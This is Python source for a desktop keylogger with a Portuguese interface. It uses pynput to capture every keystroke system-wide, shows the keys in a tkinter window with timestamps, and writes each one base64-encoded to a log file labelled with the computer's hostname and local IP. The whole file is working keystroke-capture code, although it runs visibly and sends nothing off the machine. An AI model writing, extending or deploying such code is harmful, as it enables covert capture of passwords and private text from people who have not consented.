import tkinter as tk
from tkinter import ttk
from datetime import datetime
from pynput import keyboard
import threading
import socket
import base64  # Importa base64

LOG_FILE = "log.txt"

def get_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "IP desconhecido"

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "Nome desconhecido"

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.ip = get_ip_local()
        self.hostname = get_hostname()

        root.title(f"KeyLogger - {self.hostname} ({self.ip})")
        root.geometry("700x470")

        self.letras_normais = []

        self.info_label = tk.Label(root, text=f"Computador: {self.hostname} | IP local: {self.ip}", font=("Arial", 10))
        self.info_label.pack(pady=5)

        self.tree = ttk.Treeview(root, columns=("Tecla", "Hora"), show='headings')
        self.tree.heading("Tecla", text="Tecla Pressionada")
        self.tree.heading("Hora", text="Hora")
        self.tree.column("Tecla", width=150)
        self.tree.column("Hora", width=150)
        self.tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.text_area = tk.Text(root, height=5, font=("Consolas", 14))
        self.text_area.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=10)
        self.text_area.configure(state='disabled')

        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("Início do log - {}\n".format(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
            f.write(f"Computador: {self.hostname} | IP local: {self.ip}\n\n")

        listener_thread = threading.Thread(target=self.start_listener, daemon=True)
        listener_thread.start()

    def on_press(self, key):
        hora = datetime.now().strftime("%H:%M:%S")

        try:
            tecla_str = key.char
            if tecla_str.isprintable():
                self.letras_normais.append(tecla_str)
                if len(self.letras_normais) >= 30:
                    self.letras_normais.clear()
        except AttributeError:
            tecla_str = str(key).replace("Key.", "").upper()

        self.root.after(0, self.atualiza_tabela, tecla_str, hora)
        self.root.after(0, self.atualiza_texto)

        self.salvar_log(tecla_str, hora)

    def atualiza_tabela(self, tecla, hora):
        self.tree.insert("", "end", values=(tecla, hora))
        self.tree.yview_moveto(1)

    def atualiza_texto(self):
        texto_formatado = " > ".join(f"[{c}]" for c in self.letras_normais)
        self.text_area.configure(state='normal')
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(tk.END, texto_formatado)
        self.text_area.configure(state='disabled')

    def salvar_log(self, tecla, hora):
        # Codifica tecla para base64 antes de salvar
        try:
            tecla_bytes = tecla.encode('utf-8')
            tecla_b64 = base64.b64encode(tecla_bytes).decode('utf-8')
        except Exception:
            # Caso algum erro, salva como está
            tecla_b64 = tecla

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{hora} - {tecla_b64}\n")

    def start_listener(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
